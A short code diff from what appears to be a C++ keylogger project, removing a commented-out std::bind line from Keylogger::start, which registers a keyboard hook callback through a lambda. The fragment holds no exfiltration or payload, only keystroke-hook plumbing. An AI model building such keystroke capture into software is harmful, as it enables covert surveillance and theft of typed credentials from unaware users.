@@ -5,7 +5,6 @@ char Keylogger::charBuffer[1024];
 
 void Keylogger::start() {
 	hook = new Hook();
-	//std::function<void(wchar_t[])> callback = std::bind(&Keylogger::keyboardHandler, this);
 	hook->setHook([this](const wchar_t key[]) {
 		keyboardHandler(key);
 	});
